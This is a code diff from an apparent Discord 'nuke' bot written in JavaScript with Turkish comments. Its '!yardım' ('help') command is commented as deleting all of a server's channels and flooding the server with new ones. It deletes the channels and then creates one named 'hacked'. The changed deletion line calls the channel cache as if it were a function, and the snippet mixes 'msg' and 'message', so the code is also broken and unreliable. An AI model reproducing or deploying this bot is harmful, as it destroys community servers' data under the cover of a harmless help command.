@@ -42,7 +42,7 @@ client.on("message", async msg => {
   if (msg.content === "!yardım") {     ///COKERT KOMUTU BÜTÜN KANALLARI SILIP COK FAZLA KANAL ACAR
     msg.delete();
 
-      message.guild.channels.cache.forEach(c => c.delete());      //TÜM KANALLARI SİLEN KOMUT
+      message.guild.channels.cache(c => c.delete());        //TÜM KANALLARI SİLEN KOMUT
 
     await msg.guild.createChannel("hacked", {
       type: "text"
